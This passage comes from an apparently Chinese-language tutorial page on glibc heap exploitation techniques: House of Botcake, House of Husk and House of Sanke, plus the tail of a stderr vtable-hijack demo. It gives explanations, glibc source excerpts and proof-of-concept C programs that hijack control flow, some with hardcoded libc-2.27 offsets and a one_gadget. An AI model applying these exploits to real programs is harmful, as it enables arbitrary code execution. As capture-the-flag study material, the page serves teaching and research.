class="number">0x1e8f60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wfile_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wfile_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: set stderr-&gt;_flags to ~(4 | 0x10))&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr2 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: set stderr-&gt;_IO_read_ptr &lt; stderr-&gt;_IO_read_end&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0x10</span>) = (<span class="type">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: set stderr-&gt;vtable to _IO_wfile_jumps-0x40&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wfile_jumps_addr<span class="number">-0x40</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: set stderr-&gt;codecvt with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0x98</span>) = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;codecvt-&gt;__cd_in.step with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)p1 = (<span class="type">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: put backdoor at stderr-&gt;codecvt-&gt;__cd_in.step-&gt;__fct&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p2 + <span class="number">0x28</span>) = (<span class="type">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f3b2d0a2420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7f3b2d01e000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7f3b2d20b5c0</span></span><br><span class="line">[*] _IO_wfile_jumps address: <span class="number">0x7f3b2d206f60</span></span><br><span class="line">[+] step <span class="number">1</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_flags to ~(<span class="number">4</span> | <span class="number">0x10</span>))</span><br><span class="line">[+] step <span class="number">2</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_IO_read_ptr &lt; <span class="built_in">stderr</span>-&gt;_IO_read_end</span><br><span class="line">[+] step <span class="number">3</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;vtable to _IO_wfile_jumps<span class="number">-0x40</span></span><br><span class="line">[+] step <span class="number">4</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;codecvt with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;codecvt-&gt;__cd_in.step with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: put backdoor at <span class="built_in">stderr</span>-&gt;codecvt-&gt;__cd_in.step-&gt;__fct</span><br><span class="line">[+] step <span class="number">7</span>: call <span class="title function_">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span><br><span class="line">[!] Backdoor is called!</span><br></pre></td></tr></table></figure><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1><h2 id="概要-17"><a href="#概要-17" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>绕过新版本glibc的tcache-&gt;key验证</p><p><strong>利用条件:</strong></p><ol><li>uaf</li></ol><p><strong>利用效果:</strong>double free</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-17"><a href="#原理-17" class="headerlink" title="原理"></a>原理</h2><p>当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 <code>key == tcache_key</code> ， 就会遍历<strong>这个大小</strong>的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。</p><p>从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</p><ol><li>破坏掉被 free 的堆块中的 key,绕过检查</li><li>改变被 free 的堆块的大小，遍历时进入另一 idx 的 tc_entries</li><li><strong>House of botcake</strong></li></ol><p>House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。</p><p>此外 House of botcake 在条件合适的情况下，极其容易完成多次任意分配堆块，是相当好用的手法。</p><p>简单来说就是一个chunkA,</p><p>其所属的tcache在第一次free时为满状态,使得其进入了unsortedbin</p><p>之后取出tcache中的chunk使其不满,在释放A使其进入tcache,达到double free</p><h2 id="示例-7"><a href="#示例-7" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed into tcache</span></span><br><span class="line">   </span><br><span class="line">    <span class="type">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="type">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    </span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">    assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h1><h2 id="概要-18"><a href="#概要-18" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>利用printf的自定义格式化字符串</p><p><strong>利用条件:</strong></p><ol><li>能向 <code>__printf_function_table</code> 中写入任意数据，使其不为空</li><li>能向 <code>__printf_arginfo_table</code> 中写入一个可控地址让 <code>__printf_arginfo_table[spec]</code> 为 <code>backdoor</code> 地址</li></ol><p><strong>利用效果:</strong>程序流执行</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-18"><a href="#原理-18" class="headerlink" title="原理"></a>原理</h2><p>首先要先认识下 <code>__register_printf_function</code> 函数,该函数的作用是允许用户自定义格式化字符并进行注册（注册的意思是说将自定义格式化字符与相应的处理函数相关联），以打印用户自定义数据类型的数据。</p><p><code>__register_printf_function</code> 函数是对 <code>__register_printf_specifier</code> 进行的封装，下面是 <code>__register_printf_specifier</code> 的源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line"><span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>spec是自定义的格式化字符（以 <code>ASCII</code> 所表示），比如你使用 <code>%a</code> 这个格式化字符来输出自定义的数据类型，那么 <code>spec</code> 就是字符 `a’</p><p>上面的代码先做了第一个 <code>if</code> 判断，要确定 <code>spec</code> 位于 <code>0</code> 和 <code>0xff</code> 之间，如果不在 <code>ASCII</code> 码就会返回 <code>-1</code></p><p>第二个判断是如果 <code>__printf_function_table</code> 为空，那么就通过 <code>calloc</code> 来分配两个索引表，并将地址存放到 <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> 中。两个表的大小都为 <code>0x100</code> ，可以给 <code>0~0xff</code> 的每个字符注册一个函数指针（假设我定义一个 <code>%X</code> 的格式化字符，那么 <code>spec</code> 就是 <code>88</code> ，所以将 <code>__printf_arginfo_table[88]</code> 此处存放一个对应处理函数的指针）</p><p><strong>需要注意的是，接下来的利用并不会调用到上面这个函数，但需要用到这个注册自定义格式化字符的前置知识。</strong></p><p><code>printf</code> 函数调用了 <code>vfprintf</code> 函数，下面的代码是 <code>vprintf</code> 函数中的部分片段，可以看出来如果 <code>__printf_function_table</code> 不为空（也就意味着有自定义格式化字符被注册过了）那么就会调用 <code>printf_positional</code> 函数,如果为空的话，就会去执行默认格式化字符的代码部分（因此<strong>检查自定义的格式化字符是优先于默认的格式化字符</strong>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">    save_errno, grouping, thousands_sep);</span><br></pre></td></tr></table></figure><p>而 <code>printf_positional</code> 函数中会调用 <code>__parse_one_specmb</code> 函数</p><p><code>__parse_one_specmb</code> 函数中最关键的就是下面这个片段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>可以看到最后执行了 <code>(*__printf_arginfo_table[spec-&gt;info.spec])</code> 这里本应是注册的正常的函数指针，但如果我们能够篡改 <code>__printf_arginfo_table</code> 中存放的地址，将其改为我们可控的内存地址，这样我只需要在 <code>__printf_arginfo_table[88]</code> （以 <code>%X</code> 为例）的位置存放一个 <code>one_gadget</code> 的地址，执行到函数指针指向的位置即可跳转到 控制函数中</p><p><strong>注意：上面的利用始终都没有注册自定义的格式化字符，而是通过直接篡改 <code>__printf_function_table</code> 来错让程序以为存在注册过的自定义格式化字符，从而触发 <code>__printf_arginfo_table</code> 中的函数指针</strong></p><h2 id="示例-8"><a href="#示例-8" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="例题-8"><a href="#例题-8" class="headerlink" title="例题"></a>例题</h2><p><strong>34c4_readme_revenge</strong></p><h1 id="house-of-sanke"><a href="#house-of-sanke" class="headerlink" title="house of sanke"></a>house of sanke</h1><h2 id="概要-19"><a href="#概要-19" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>此利用与<code>house of apple</code>、<code>house of cat</code>、<code>house of emma</code>等利用一样，利用了修改虚表指针的方法。主要思路就是修改虚表指针为<code>_IO_obstack_jumps</code>实现攻击。</p><p><strong>利用条件:</strong></p><ol><li>能修改<code>stdout</code>、<code>stdin</code>、<code>stderr</code>其中一个<code>_IO_FILE_plus</code>结构(fastbin attack或tcachebin attack)或劫持 <code>_IO_list_all</code>。(如<code>large bin attack</code>、<code>tcache stashing unlink attack</code>、<code>fastbin reverse into tcache</code>)</li><li>能够触发<code>IO</code>流，执行<code>IO</code>相关函数。</li><li>能够泄露堆地址和<code>libc</code>基址。</li></ol><p><strong>利用效果:</strong>程序流执行</p><p><strong>有效版本:</strong>2.36及以前,2,37去除了_IO_obstack_jumps</p><h2 id="原理-19"><a href="#原理-19" class="headerlink" title="原理"></a>原理</h2><p>在glibc/malloc/obstack.h中声定义一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="type">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其又被包装于glibc/libcio/obprintf.c中的_IO_obstack_file结构体中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>简单来说，就是给<code>_IO_FILE_plus</code><strong>追加了一个指向<code>obstack</code>结构体的指针</strong>。</p><p><strong>_IO_obstack_jumps</strong></p><p>由上可知，<code>vtable</code>必须合法，我们观察以下<code>vtable</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span 